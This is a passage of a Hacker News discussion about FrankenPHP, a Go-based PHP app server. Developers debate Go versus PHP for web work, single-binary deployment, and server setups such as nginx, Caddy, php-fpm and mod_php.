    "commentBody": "FrankenPHP: Modern PHP App Server (frankenphp.dev)389 points by aquova 15 hours agohidepastfavorite180 comments harrisonjackson 14 hours agoI haven't done any php development in maybe 10 years but this landing page almost got me to spin up a hello world. I like the elephant frankenstein character - goofy and ugly/cute. Design, color scheme, copy, and animations are clean :chefkiss: The value prop is well highlighted - at least for someone that's been out of php dev for a while. This seems like a nice way to bootstrap something small. Getting started code snippet makes it seem quick and easy. reply zer00eyz 13 hours agoparentI moved from PHP to Golang a bit over a decade ago... Because binary deploys are the bees knees. I dont want 8 containers isolating a bunch of bad software or worse messed up dependency's (looking at you python, maybe some ruby and node code as well). Because rather than releasing installable software you packaged up \"works for me\" and shipped it to the world. I might play with this out of nostalgia but not so sure that I want these sorts of things in my production environment any more. reply francislavoie 13 hours agorootparentThis is PHP running inside a Go server, btw. Compiled with CGO. One binary, one process. reply zer00eyz 12 hours agorootparentWow the PHP is going to magically get into the binary? /s Yes I could build this with c-go + the PHP and statically link everything (and there might need to be a bit of prayer involved...) ... or I could just write GO and accomplish all the same things with fewer steps. That knotted up mess is why containers are popular. reply withinboredom 12 hours agorootparentThere are things Go excels at and there are things PHP excels at. They donâ€™t always overlap. For example, you can write a simple web app in 100 lines of php code, and a process manager in 100 lines of Go code. If you flip the languages around, the number of lines explodes. reply zer00eyz 11 hours agorootparentI started writing PHP back in the 3 and 4 days... I have been writing go for over a decade. If I had to add a few dynamic elements to a static HTML site, php is still king. If we're building an API, go will win hands down. Not only in LOC but performance, and reporting. When you get into whole pages (think blogs or shopping or... ) a lot of that is going to depend on what framework you're grabbing on the PHP side. There arent a lot of \"batteries included\" solutions on the golang side... You might end up writing fewer lines of code in the first week but by the end of the month were going to be at feature parity and your quickly going to fall behind. The moment I need a SPA, on page interactive GUI you're going to end up with a JS framework and an API back end... here again, go will shine. reply withinboredom 11 hours agorootparent> If we're building an API, go will win hands down. I'm not so sure of that. Writing business logic in PHP is usually more concise than in Go, and more flexible. Also, I can think of a number of json schemas that are impossible to replicate in Go's type system but work just fine in PHP. reply dgb23 7 hours agorootparentYou can't fully replicate JSON schemas in either language without writing logic. In terms of just static definitions, Go has typed container types while PHP has not. That's a pretty common case for JSON. PHP is more convenient at another common case which is heterogeneous maps. Neither of those languages make me particularly happy in that regard. It also depends on what you're doing with the JSON. If you want/need to walk through it in a single pass fashion, then Go is definitely more fitting. reply zer00eyz 10 hours agorootparentprev>> Also, I can think of a number of json schemas that are impossible to replicate in Go's type system but work just fine in PHP. Not at all. There are some that would be painful to write \"by hand\". An expansive and nested set of null fields would suck if I had to spell it all out... https://sqlc.devIf you use the std lib you can write a simple web app in Go as well in few lines of code? PHP is made for web development though, while Go is made for different use cases. Comparing the standard libraries makes this very clear. Things PHP comes with that Go doesn't come with (just as some examples about standard library differences): PDO (DB interface), session management, built-in mail sending, localization and internationalization. That's just from the top of my head. Go has it's places though, and it works well for web development too. But even I who like Go in general more than PHP, can acknowledge that PHP (by default) is better setup for web development out of the box. That said, I would much prefer Go than PHP too, but hard to argue against PHP for web development without resolving to emotions and feelings. reply dgb23 6 hours agorootparentApart from localization all of the things you mentioned come with Go as well. There's net/smtp, database/sql. You can implement in-memory sessions in Go with a few lines or use the well established gorilla sessions or similar. The only thing you _need_ to install via dependencies is a DB driver. On top of it you are getting a HTML template system with very good security defaults. You are generally better guided and guarded when dealing with HTTP user input. Routing and handling is more explicit and doesn't require you to deal with the Apache configuration syntax etc. There are no arcane configuration footguns like max_input_vars that will silently break your application and so on. Errors handling and logging are again, more straight forward, universal and explicit. If you need interactivity, SEE and Websockets are not only easier to use but also a more natural fit for Go. I think for a language beginner those things are very, very beneficial. Us more experienced programmers sometimes forget how many battle scars we had to earn with languages like PHP. reply eru 9 hours agorootparentprev> Wow the PHP is going to magically get into the binary? It's fairly simple to pack assets into a binary. (Not sure, if they are doing that. But it wouldn't involve any magic.) Compare also https://doc.rust-lang.org/beta/core/macro.include_bytes.html Btw, making a tarball or a zipfile is also a way to put multiple files into one binary file. You might have even heard of self-extracting zip files? They were very popular, before Windows got a build-in unzipper, I think. reply kdunglas 5 hours agorootparentOptionally, you can embed the PHP scripts in the final binary using a Go feature similar to `include_bytes`: https://frankenphp.dev/docs/embed/ But for PHP, it's even simpler: PHP is available as a C library, and we just use it. (libphp can be embedded using static compilation, or used as a dynamic library, we support both). reply francislavoie 12 hours agorootparentprevWell, FrankenPHP avoids that prayer, cause it's already done for you lmao But obviously the point of using PHP is for its ecosystem, frameworks etc. Go is still missing a lot of that, the Go community has a weird aversion to frameworks. reply zer00eyz 11 hours agorootparentI wrote PHP from version 3 to version 6... I remember PHP before it had \"frameworks\"... PHP ate perl because the battery's were included, you didn't need CPAN, and it had an amazing manual... Python (pip), Ruby (gems) and Node (NPM) all looked much more attractive because they had rich library's at their core and symphony wasnt really useful yet. Yet Go eschews a lot of the same package management issues those other languages have. And a lot of go devs look at the standard library the same way early PHP devs looked at it \"I dont need a lot more than this\". It's not that go devs are framework adverse we only want what we need and nothing more. In a language that favors composition frameworks quickly become \"baggage\". It's kind of interesting to watch someone come from a language with a strong package ecosystem and watch them build their first go project. They tend to cruise GitHub and throw EVERYTHING in the cart. It takes them 3-4 days of working with all that before they are complaining up a storm! You hand that same dev SQLC, Validator, and point them at middle ware and the standard lib and ask them for API's and they come back 2 days later grinning ear to ear. Go, done well, is brutalism. Blocky, functional concrete buildings have an amazing charm to them... Go is blocky, its utilitarian, its expressive... You dont write cute code in go, you dont try to make go magical, you want clear easy to read and understand code... Your more likely to come back and add features long before you have to address the performance of go. reply ceejayoz 4 hours agorootparent> I wrote PHP from version 3 to version 6. There was never a released version 6. https://wiki.php.net/rfc/php6 reply seszett 11 hours agorootparentprev> version 6 PHP6? That was long ago because I don't even remember it! I don't have much to say otherwise, except you could very well say the same \"Go is great\" without having to shit on PHP and the project that is being discussed here. Especially since you don't really come off as very knowledgeable on what you're talking about. reply zer00eyz 10 hours agorootparentIt might shock you that I wrote perl before PHP... I have been in the game a LONG time. I was around for php being the language that EVERYONE shit on. I was around when PHP got somewhat huge and respectable. PHP buttered my bread for a number of years and I was one of its bigger advocates. My lament here isnt about PHP at all.. It's about the instructions here: https://frankenphp.dev/docs/embed/ to generate a monolithic binary... It's about the execution of this script https://github.com/dunglas/frankenphp/blob/main/build-static... None of that is very go like at all. Having spent a lot of time with PHP I recognize a good portion of what turns up in that shell script. That having been said there are parts of it (the curl of the diff) with NO context that I would pause and go figure out what the hell that was. It really needs a note as to WHY it's there so I dont have to go hunting. It looks like the shell script is meant to work in the docker container... A real build system might be in order here (make, basel, mage). reply pierstoval 8 hours agorootparentIt doesn't matter you wrote perl before PHP, actually. You're talking about PHP6 like it's a thing (spoiler alert: it was never released), and you don't seem to have ever used one of the famous frameworks PHP had seen since the 2010s. Even Symfony 1 was here in 2005, and PHP 5.3 brang a complete revolution and growth of the entire ecosystem (thanks to closures and namespaces, at first), which made people embrace PHP more willingly, Composer was released, incredible frameworks were created and used Composer (that's how we got Symfony 2, and Symfony later helped Laravel come as an extremely popular framework). All of this was funded by companies that believed in PHP, while PHP-haters moved to something else (I know that: my older brother, who's also a dev, did some PHP back then, but was more appealed to other techs like Java). You moved to Go? Good: PHP doesn't do everything that Go does, because it wasn't meant for that. We do PHP instead? Perfect: Go wasn't created to develop web-apps in the first place, it's a low-level network-related project, and turned into something way bigger that allows you to code web apps quicker than in Go's early life. PHP has always been about creating web applications, and will always be, even when some people try to tinker with it on some other levels (like servers using async & threads, or desktop apps). And honestly, FrankenPHP is an incredibly good combination of both worlds: brings all the scalability of Go, with the flexibility of Caddy (which is written in Go too) in the infrastructure, while allowing us to continue coding with all the incredibly powerful frameworks we have in PHP to create the web app. It's the best for all the people that have an interest in that. You can't hate on that unless you just hate for the sake of hating. reply zer00eyz 1 hour agorootparentWow. > You're talking about PHP6 like it's a thing (spoiler alert: it was never released) Spoiler alert PHP 6 was a thing. Spoiler alert PHP 6 NOT being released was a blemish on PHP that made a lot of people say \"we might not have a future here\"... Python spent years going from 2 to 3 while PHP chugged through 4 and into 5. Python ripped the UNICODE bandaid off, the one that PHP could not... https://webcollab.sourceforge.io/unicode.html . And yes MB strings work... I did a fair bit of I18N work back in the day. PHP string mishandling was in all the dark corners and odd bugs you had to dig out of a codebase. I made good money doing it, it was NOT fun... >> Even Symfony 1 was here in 2005, and PHP 5.3 brang a complete revolution and growth of the entire ecosystem No one gave a shit about symphony at the time unless you worked for a body shop. We all wanted to build on Zend, and for good reason. Zend server (the opt cache and debug tools) and corporate backing was one of the things that made a lot of companies comfortable with their PHP plunge. \"Open source\" was still rather novel coming out of the Y2k bubble, and managers were still old guard and wanted an \"IBM\" style name (to blame if the shit hit thee fan). There is a reason that magento chose to build on top of ZF. (SO much EAV ptsd). It also became super common in this time to run a Drupal Or WP site for your marketing department. Slapping theses up was a no brainer, and to some degree still is. These tools a bit reason that PHP still has a massive footprint for such a large portion of the web. > Go wasn't created to develop web-apps in the first place, it's a low-level network-related project Umm NO. > PHP has always been about creating web applications, and will always be After the 6 debacle and unicode support this limitation is why a LOT of the best php dev's around moved to python, or ruby... Being able to easily reuse your tools in batch processors or cli script in an intuitive way was a boon. RabbitMQ and Sidekiq were eye openers for a lot of early 2010's php devs that things were moving on, that the \"pure web\" was coming to an end. Yes Composer was a thing, but it seemed pale compared to PIP or Gems (and in a lot of ways still is)... PHP being on every $10 a month hosting package gave it legs. The fact that it's still so web focused with modern dev is now a short coming... For as much as the langue evolved it needed to evolve here and didn't. >> And honestly, FrankenPHP is an incredibly good combination of both worlds: brings all the scalability of Go, with the flexibility of Caddy ... From the PHP side it's impressive. From the Go side less so... One of the joys of writing go is being able to deploy a single binary with ease. I can skip \"containers\" all together with a standard go program. Frankenphp has directions to accomplish the same thing... using either a docker container (this should be a code smell), or a shell script. Have you read that shell script? If you have then wee both have the same questions (Oh boy does that thing need some comments). Make, Basel, Mage would be much more appropriate here, because that shell script is UGLY AF... but these would all be harder to get working \"containerless\". Unless I missed the hook, that build process doesn't even run tests first... This is the thing with go. Can I run the tests, Can I build, is the build painful, is there a reason for it being \"non standard\" (the CGO qualifies here) ... is the build process sane (this one needs a lot of work) ... reply kdunglas 5 hours agorootparentprevThis script is entirely optional and is only used to create static builds of FrankenPHP or to create self-executable PHP apps. It doesn't require a Docker image but does need some system dependencies. It is not necessary to create a standard (dynamically linked) build of FrankenPHP and isn't used in the Docker images we provide: https://frankenphp.dev/docs/compile/ reply cess11 11 hours agorootparentprevPHP 6 was never released. reply conradfr 12 hours agorootparentprevThis is the one good thing non-Go web developers are jealous about Go. reply BartjeD 12 hours agorootparent.Net and rust and many other languages also support binary deploy. You raise the impression this is a unique property of 'go', how come? You guys have go tunnel vision because you work with it? reply withinboredom 12 hours agorootparentGo started it. Or at least, popularized the static build, single binary docker files. Naturally, youâ€™ve been able to do this since forever with many languages like C/C++ etc. reply pjmlp 11 hours agorootparentAmong people that have used nothing besides scripting languages. reply jchw 3 hours agorootparentTo be honest, it was and is pretty rare to see C/C++/etc. self-contained static binaries on Linux. Glibc doesn't even properly support static linking, and musl does not have 1:1 parity with glibc, so it's challenging to even give a \"single binary\" for C/C++ programs on Linux, less in the past before musl and during musl's infancy. The more popular thing to do on Linux is something more like AppImages where you bundle a bunch of stuff into a single self-executing file, and that ultimately still is a dynamic binary depending on system libraries (and therefore can't be e.g. plopped in an empty Docker container.) (And yes, Windows and macOS, and probably most of the BSDs, don't really suffer too badly from this issue, since dynamically linking to system libraries/libc is not a problem. Still, not needing libc remains a big advantage for Go since it is possible to cross-compile self-contained Go binaries to any platform Go can target from any other platform; this is challenging to do with C/C++, especially for targets like macOS.) Even if you do get past the code though, there's the assets. For C/C++, bundling static assets into an executable is oddly challenging. There's been a bunch of different bin2c-type programs over the years, yet somehow not really many \"standard\" approaches to doing it, and many of them suffer from bad performance (especially approaches that go to a source file instead of an object file). Just now, finally, in the past couple years, there is #embed in C... for embedding a resource file. Meanwhile, Go has had several good options in the ecosystem for embedding entire directory trees and using them inside of VFS layers for ages, and since Go 1.16 (2021) it has support for that as part of the toolchain. Go didn't invent the concept of making a single self-contained executable, it did however push the status quo quite far. I contend that I have the experience to make this claim. P.S.: To be clear, I'm definitely not saying you literally can't, and I am aware of Cosmpolitan libc and APE, which are pretty cool. Of course, with effort, you absolutely can make static binaries using C/C++. I just recently did this with a C++ and Rust program using musl; it's tricky, especially since many build setups don't really support these kinds of deviations, but it's possible. One major problem I have with this is that I don't really feel very confident in the stability of the resulting binaries; if something calls dlopen with static musl, it will crash, and behavior of certain things like DNS resolution also changes in ways that may break some programs. The reason why Go's contributions matter is that for basically as long as I can remember, the way to do this in Go is to install the toolchain and run `go build`, any host platform, any target platform, and it's well-supported by virtually everything because it is the default behavior. (And if anything, Zig is closer to bringing this to C than any of the C/C++ toolchains...) reply pjmlp 2 hours agorootparentAll self inflected problems in the GNU/Linux ecosystem, that don't change the fact the computing world since FORTRAN was introduced as first compiled language in 1957, static compilation was a thing. Also embedded resources has been a solved problem in most non UNIX platforms for decades. reply jchw 34 minutes agorootparentSelf-inflicted or not, this is what Go solved. 1957 FORTRAN binaries don't really detract from what Go did: nobody is claiming Go invented self-contained binaries, we are claiming it solved problems with single-file deployments that other language ecosystems still struggle with, and I stand by this 100%. reply zer00eyz 11 hours agorootparentprevRust and Zig also do compile to binary. They just weren't part of the stack in thee article... I dont think I would use either of them in the same places I want to use GO... Things that were java, or python are candidates to be written in go. Things that were C or C++ are good candidates for Rust or Zig. Look at cloudflares nginx replacement, it's written in rust for a GOOD reason. Thats not a place where go will shine being a GC language. reply conradfr 12 hours agorootparentprevThat was not my experience when I worked with .Net, IIS and the whole thing but it was a long time ago so good to know :) reply tracker1 1 hour agorootparent.Net is a lot more sane now... since Core releases (mostly). Linux deploys with docker are pretty typical these days. reply lomase 5 hours agorootparentprevHow long ago? Nowdays most people dont use ISS for docker builds, it usually runs on Linux containers. reply bdd8f1df777b 11 hours agorootparentprevGo popularize it, and still leads in the easiness of cross compilation. reply gertop 11 hours agorootparentprev.Net only recently added support for it and it's very brittle. Rust is indeed in the same league as Go, I guess the difference is that Go is batteries included when it comes to web development. You don't have to pull many dependencies, unlike rust. reply tracker1 1 hour agorootparentRust isn't so bad... A lot of devs have started to normalize around Axum/Tokio, which is pretty well supported. A lot of boilerplate API stuff is about as easy as it is with Go after a project is up and running. reply neonsunset 7 hours agorootparentprevNo itâ€™s not. Self-contained deploy has been a thing since .NET Core 2.1 (or earlier?), released 6 years ago. Either way, deploying .NET applications has been very easy regardless of deployment mode for as long as they were using Kestrel. Today, it reached the point where .NET outperforms Go in publishing/packaging of AOT binaries as it can be statically linked together with native dependencies, metadata tables and pointer-heavy structures in the binary are dehydrated and compressed and the resulting binary uses standardized object and symbol format understood by all existing tooling that otherwise works with C, C++ and Rust. reply pjmlp 11 hours agorootparentprevMany non Go Web developers know about static compilation, before shared objects were even a feature in mainstream OSes. reply rafark 12 hours agorootparentprevAnd charm.sh reply sam0x17 4 hours agorootparentprevPHP had the unique fun of when an attacker was able to write files to the server they could literally write new PHP files and get them to execute. I miss that worry somehow reply ivanhoe 3 hours agorootparentYou can do that or something similarly bad in pretty much any language if you have write access to where the files are. That's really a server misconfiguration problem, not php problem. Huge misfortune of php is that because of the timing and huge popularity in relatively early days of web it got to be permanently associated with amateurs doing stupid shit. I was part of that early era, so trust me that php4 as bad as it was, was still fantastic compared to writing CGI scripts in C, or running mod_perl that you had to restart every time you edit some file. reply tracker1 1 hour agorootparentprevf-that... read-only containers for the win. reply hipadev23 12 hours agorootparentprevwhy would it be 8 (or any N>1) containers for a php/node/python/ruby app? reply gertop 11 hours agorootparentPython is pretty messy to deploy without a container. Sure you can (and should!) use a virtual env, but by that point using docker isn't much more efforts. Rails and Node and PHP have at least the decency to have the project's dependencies contained inside the project's own directory by default. reply gnz11 7 hours agorootparentThatâ€™s the default of the package managers (i.e. composer, npm, etc) not the language. Setting up a virtual env for Python is a one liner. Hardly messy. Iâ€™d argue that deploying a Python web app with mod_wsgi or gunicorn isnâ€™t any more difficult than deploying a PHP web app with PHP-FPM. If anything Iâ€™ve seen far more misconfigured PHP-FPM setups than gunicorn setups. reply hipadev23 11 hours agorootparentprevnah not questioning containers. questioning why he wrote 8 (obviously exaggerated) and why itâ€™s not 1. reply deergomoo 11 hours agorootparentNginx/Apache/Caddy + php-fpm + something like MySQL if your database lives on the same server as your application. PHP in its default form isnâ€™t a persistent process[0], so you will typically have a web server accepting the requests and forwarding them onto PHP to generate a response. 0: it actually usually is these days for performance reasons, with a pool of processes that are reused. But the mental model is one short-lived process per request reply hipadev23 6 hours agorootparentand if the Go dev needs a database, or a cache, or an actual fully-featured HTTP daemon processing the requests? Iâ€™m just confused about their focus on â€œsingle binaryâ€ when applications in those languages tend to be a single-container plus the same supporting services their single binary is going to need too. reply cess11 3 hours agorootparentprevRight, so CGI is quite old by now, which is basically this: a binary in a directory and a proxy that throws packets at it. It has its pros and cons. In some cases it's actually quite nice to have a platform like Wildfly or the BEAM, or you knew so little about the future load peaks that you started with cheap shared hosting and hence PHP so when you outgrow it FastCGI and nginx is a much better option than a great rewrite to Golang. Building in the languages and on the platforms you already know will always be much faster and more convenient than betting on someone else's 'bees knees'. reply pjerem 12 hours agorootparentprevIâ€™m a total noob in Go but is there something that approaches completeness of the good old monolithic frameworks ? Iâ€™m in a pause in my career and Iâ€™m having a great time working on a \"side\" project in Django currently. Everything just works and makes sense, I just have to write business code and it gives me a nice app. Iâ€™d be happy to try Go for fun and because deploying Python/Diango is a mess (at least without docker) but my project isnâ€™t API first, itâ€™s deliberately a traditional server side rendered app. Every Go frameworks I stumbled upon looked like they were made to serve APIs and In the case of a 1 man team, it defeats the purpose of easy deployment since you will anyway need to code and deploy a full blown frontend (and front end fatigue is a big reason why my career is currently in pause). reply zer00eyz 11 hours agorootparentGO + HTMX + standard templates... or some folks swear by templ On the API side (not what you wanted, but good looking) is sqlc + validator Between all of those you have everything you want for a website. Week 1 go is going to be a lot slower than Django or Rails. You're going to have a bit of bootstrapping to do for your project. By the end of the first month you will be a week or two behind but performance parity will be the same (you should have roughly the same feature cadence). A good framework brings a lot to the table. With go you have to \"solve\" for that yourself. \"How do I log a request\" would be one of those first questions... the answer is \"the standard logger is pretty good\" and \"Middleware is awesome\". It's a question that has a simple, short, very common answer. One that works for web apps or CLI apps or ... It takes a bit but you end up embracing the idea that less is better reply tracker1 1 hour agorootparentWas going to say the same... Similarly .Net (razor views) + HTMX is pretty nice as well. There's YouTube content for both, on the .Net side, there's some JetBrains extensions to make the HTMX experience relatively seamless. reply CoolCold 6 hours agorootparentprevMind sharing bit more on this? > because deploying Python/Diango is a mess (at least without docker) I'm playing around with FastUI (disclosure - I'm not a programmer at all), so I'm in \"day 0\" position and would like to hear more on \"day 1\" side of things. Coming from Ansible side - it's easy peasy, just install things with pipenv and later `pipenv run ...` reply JodieBenitez 11 hours agorootparentprev> Iâ€™m a total noob in Go but is there something that approaches completeness of the good old monolithic frameworks ? Some of them try, but it's really hard to beat 20 years of development, real-life use cases, third party tools and docs, etc. > deploying Python/Diango is a mess (at least without docker) Install your django app in a venv, serve it with gunicorn behind apache/nginx... done. No docker required. > Every Go frameworks I stumbled upon looked like they were made to serve APIs Indeed, that's pretty much what Go was made for. And it's also the current trend. > my project isnâ€™t API first, itâ€™s deliberately a traditional server side rendered app Stick with Django then, because it remains an excellent choice for such apps. And these apps remain an excellent solution to a vast array of problems. > front end fatigue is a big reason why my career is currently in pause I'd argue you don't have to follow this trend to be useful. Actually, something like Django+Unpoly or HTMX probably covers 99% of the use cases with very low frontend development. reply slim 11 hours agorootparentprevdid you miss this part in Frankenphp website ? :) Build standalone, self-executable and dependencies-free binaries for your PHP web applications, and command-line tools. reply thomasfromcdnjs 12 hours agoparentprevYeah it has to be one of the best landing pages I have ever seen. Fun and instantly understood. reply whalesalad 3 hours agoprevInterested to see how this fares on Tech Empower's benchmarks: https://www.techempower.com/benchmarks/#hw=ph&test=fortune&s... At the moment it is at the bottom as a \"did not complete\" reply jslaby 14 hours agoprevLong time C# dev, now I primarily code in PHP8 which is a great language to quickly get things done. This is the kind of direction the language needs to go in, instead of the older LAMP which can require somewhat complex Apache configuration. reply hparadiz 14 hours agoparentPHP dev of 18 years here. Use nginx with php-fpm. It takes 5 minutes to configure. Edit: I'm gonna give this thing a try too but I've never had any bottlenecks with either nginx or Apache. They both take a few minutes to get going at most. reply codegeek 3 hours agorootparentIt takes 5 minutes to configure with the defaults. But once you need to optimize PHP-FPM to handle more requests, you now find yourself fiddling with pm.max_children etc settings and need to know what you are doing. I love working with PHP and Go both btw. But PHP configurations can be a pain if you do anything other than defaults. reply anonzzzies 13 hours agorootparentprevFew seconds with docker. There are fully loaded compose ones that include everything so you donâ€™t need to add anything. Itâ€™s lovely. For prod itâ€™s better to only leave the needed extensions etc of course but for dev itâ€™s so easy to get going. And to be honest, for small personal, company internal and less than $1000/mo rev saas, we just use the fully loaded in prod as well. reply tommica 12 hours agorootparentHow does your production one look like if I may ask? reply lordofgibbons 14 hours agorootparentprev>It takes 5 minutes to configure Is that because you have 18 years of experience, or would it be as easy for a new developer? reply chrisandchris 14 hours agorootparentI was a long-time PHP dev and then moved on to C#. I was close to writing this nginx/fpm setup lookss very complex compared to \"dotnet run\". But then I remembered, in ASP.NET you have a Program with 50 lines of code that must have an exact order, otherwise thinks work except they don't. So I would say, knowing these two languages, PHP really is that easy to setup. reply neonsunset 7 hours agorootparentThis has not been true for a long time. reply hparadiz 14 hours agorootparentprevI just have the right config for both Apache2 and nginx from hundreds of sites. The config itself is only 50 lines. You can find a good one and stick with it. reply troupo 12 hours agorootparentYup. The process of finding alone will take more than 5 minutes. And is likely to not work for your particular circumstance. reply njovin 14 hours agorootparentprevYou can have a a ~20 line docker-compose.yml file that only requires you to `docker compose up` and you're up and running. It's gotten insanely easy to run php-fpm + nginx + [whateverdb] in a set of docker services that require virtually no configuration. reply troupo 12 hours agorootparentAnd who is going to write that ~20 line compose file with \"no configuration\"? A newbie? reply wruza 10 hours agorootparentAn LLM of course. They are really good at â€œtrivial but you have to find a good tutorialâ€ types of work. reply cess11 11 hours agorootparentprevWhen you're configuring Internet facing Linux services you're kind of out of the newbie area. A newbie is more likely to use the built-in development server and then SFTP a 'git archive' to a shared host. reply donatj 14 hours agorootparentprevI think it would be roughly that easy for anyone with basic nginx experience. Nginx includes a php fast-cgi snippet that you just `include` from your server block. It really is very easy. reply hluska 3 hours agorootparentprevYou wonâ€™t find this answer very satisfying, so feel free to ask questions. But it depends on what youâ€™re trying to accomplish. If youâ€™re sticking with defaults, itâ€™s very easy - itâ€™s less than ten minutes of work or seconds if youâ€™re comfortable working with Docker. On the other hand, letâ€™s say that youâ€™re running into problems scaling to handle more requests. Youâ€™ll end up having to tweak the max_workers setting. That takes a bit of experience or it can be a lot of â€˜funâ€™ (in the Dwarf Fortress sense). So yes and no. But a lot of people have been through this, have all the trauma you would receive and tend to be quite helpful. You can do it! reply ofrzeta 10 hours agorootparentprevApache with mod_php actually takes just \"apt install libapache2-mod-php8.2\" to work. reply idoubtit 9 hours agorootparentYou shouldn't use mod_php. It's a security nightmare. https://www.php.net/manual/en/security.apache.php Even Apache httpd discourages the usage of mod_php. If installed, Apache recommends some extra configuration to limit memory leaks. https://cwiki.apache.org/confluence/display/HTTPD/php reply ofrzeta 5 hours agorootparentThere are a lot of strange assumptions on that first page: - \"for example, if you are using PHP to access a database, unless that database has built-in access control\" - well, of course I will use a database with access control like MySQL - \"It's entirely possible that a web spider could stumble across a database administrator's web page, and drop all of your databases\". Of course I won't run PHPMySQLAdmin or Adminer on a production server, nor will I expose it to the public. - also none of the above has anything to do with the PHP execution model The second page might raise some valid issues but for instance the bullet point \"mod_php is loaded into every httpd process all the time. Even when httpd is serving static/non php content, that memory is in use\" - doesn't matter to me when I am running everything through index.php routing anyway. \"mod_php is not thread safe and forces you to stick with the prefork mpm (multi process, no threads), which is the slowest possible configuration\" might be true but also a premature optimization. Maybe mod_php is really bad but the arguments presented here are not very convincing to me. reply ihateolives 9 hours agorootparentprevWhy use mod-php when you have fcgi and fpm? reply netol 7 hours agorootparentIt's simple and there is less overhead. Since PHP runs directly within the Apache process, there is no need for inter-process communication (no TCP, no sockets), reducing the overhead. This can lead to lower latency for individual requests. reply cholmon 5 hours agorootparentmod_php does give you better response times for individual requests, but at the expense of being able to handle a higher load of traffic; you'll run out of memory and/or experience timeouts on mod_php way before you do with php-fpm. With mod_php, every Apache process has the PHP engine embedded in it, even if PHP isn't needed, e.g., to serve a request for a .css file. When Apache gets a bunch of requests for flat files, it forks all those processes and fills up RAM with copies of the PHP engine that aren't used. That's not only wasteful, but it dramatically increases the chances that you'll run out of memory. You can limit the number of Apache children of course, but you'll see timeouts sooner when you get a traffic spike. By having Apache proxy over to php-fpm for PHP requests, you can configure Apache to use mpm_event for serving static files, which allows for much leaner Apache workers (memory-wise) since they aren't carrying PHP around on their backs. While you're at it, you can use haproxy on the same machine for TLS termination, then you can disable mod_ssl thus making Apache workers even lighter. reply netol 2 hours agorootparent> With mod_php, every Apache process has the PHP engine embedded in it, even if PHP isn't needed, e.g., to serve a request for a .css file. When Apache gets a bunch of requests for flat files, it forks all those processes and fills up RAM with copies of the PHP engine that aren't used. That's not only wasteful, but it dramatically increases the chances that you'll run out of memory. You can limit the number of Apache children of course, but you'll see timeouts sooner when you get a traffic spike. Yes, that is true. But most high-traffic websites will cache static files such as CSS files and images, using a reverse proxy (e.g. Varnish, a CDN, or usually both). So I don't think this is a real problem, most of the time (99.9%?), a request for a static file will not hit Apache. I'm not saying mod_php is better for all scenarios, of course, but I think it can be ok. reply francislavoie 13 hours agorootparentprevJust as a reminder, you can use Caddy + php-fpm as well (with vanilla Caddy, no plugins). What this does is give you a way to run your webserver + PHP as a single process, or single Docker container (instead of the traditional 2-container approach), and it also unlocks the ability to run PHP in a worker mode, where you have long-running PHP processes that have your framework loaded in memory ready to serve requests, instead of booting the framework on every request (so, much lower request latency). reply hparadiz 13 hours agorootparentCaddy uses more RAM and has no inherent benefit when running a project in production professionally. Caddy is easier for self hosted cause it automatically handles HTTPS where Nginx does not. Related reading: https://blog.tjll.net/reverse-proxy-hot-dog-eating-contest-c... reply withinboredom 12 hours agorootparentCaddy â€œusesâ€ more ram because Go is a garbage collected language. It can free tons of it, but that costs cpu cycles. It generally wonâ€™t spend too much time freeing memory until the system is under pressure. Because itâ€™s Go, you can tune garbage collection to be super aggressive, at the expense of speed. reply m_sahaf 12 hours agorootparentprevCiting that particular blog post isn't making the point you think it makes. To quote: > The most striking piece of new knowledge for me was learning about failure modes. Nginx will fail by refusing or dropping connections, Caddy will fail by slowing everything down. Do you want your clients failing to load your website at all? Is this the best approach to serving users? reply jeroenhd 12 hours agorootparent> Do you want your clients failing to load your website at all? Is this the best approach to serving users? There are good reasons for picking either. Large services under sudden load sometimes implement queueing, which is just failing but stylish. For my blog posts, I'd rather throw an error than have people wait for thirty seconds. The contents aren't that important and the end result will probably look bad because of missing CSS anyway. For API services, I'd want things to slow down rather than fail, unless failure is explicitly documented in the API and can be handled somewhat gracefully. reply mholt 12 hours agorootparentprev> has no inherent benefit when running a project in production professionally Tell that to Stripe and Framer and numerous other businesses using it very seriously and very much professionally! ;) reply cess11 11 hours agorootparentprevI'm a pretty hardcore nginx fan with a decent chunk of rather low level professional experience with it in complex setups. The reason I'd still pick nginx over Caddy for prod is that I know really well how a broader tool set will work together, e.g. keepalived and whatnot. Caddy kind of feels like a cute toy in comparison with nginx, but it's not, by now it's been seriously battle tested and has proven itself to be quite resource efficient and resilient. reply klaussilveira 7 hours agorootparentkeepalived? What do you mean? reply CoolCold 6 hours agorootparentI think that OP really meant that in his/her mental model of things, answers already known and battle tested for numerous cases [by using Nginx] - making HA with keepalived? Check. Making logging to be buffered to save iops? Check. Implementing ratelimits and custom logic? Check. Keepalived is not really bound to Nginx by any means and should perfectly fine work with Caddy too. reply cess11 6 hours agorootparentYeah, precisely. I'm sure it works fine with Caddy too, it's just that I haven't had Caddy with me in the trenches, yet. reply cess11 6 hours agorootparentprevIt's a tool you tend to come across when you're building highly available network systems, https://github.com/acassen/keepalived . You might use it to implement redundancy in the load balancer layer of your system, perhaps your firewall round-robins incoming connections between two IP:s where you have nginx proxying to share load between two mirrored clusters, and those IP:s are virtual and handled by keepalived that will shuffle in a backup virtual server if the one currently serving becomes unhealthy or needs to be switched out due to a config rollout or something. It's a really neat way to be able to just throw more virtual servers at the problems in availability, redundancy, load balancing and so on. I think it does some ARP messaging to achieve this. Edit: I've applied it with ProxySQL in one case, it was an application on a trajectory from a simple rig with one virtual web server, one virtual database server to a highly available and resilient system. When I left we had a master-master-cluster with ProxySQL in front, with three ProxySQL-machines keepalived, so in case one went out for some reason there where two more in the stack to fill in. When you aren't sure what kind of peak load you're going to handle it's nice to know that when the alarm comes you have one fresh machine buying you some time while you figure out what you need to do to the third before it is shuffled into service. reply n3storm 14 hours agorootparentprevI agree. Having separated php processing and http processing brings good practices and helps further scalation. reply El_RIDO 11 hours agoparentprevAnd to add one more option to the comments (beyond [frontend] + php-fpm): Nginx Unit https://unit.nginx.org/ - like Apache + mod_php runs as a single service, handles the multiprocessing of php (and other languages), static files, reverse proxy and even lets you configure both itself and php via a single configuration (either as a file or dynamically at runtime, via a socket): https://unit.nginx.org/configuration/#php Here is an IRL config example: https://github.com/PrivateBin/docker-unit-alpine/blob/master... The resulting container image can be pretty small: https://hub.docker.com/r/privatebin/unit-alpine reply lelanthran 14 hours agoparentprev>This is the kind of direction the language needs to go in, instead of the older LAMP which can require somewhat complex Apache configuration. I hardly every set up PHP (once each time I reinstall my desktop, which was last in ... 2018?) but I recall 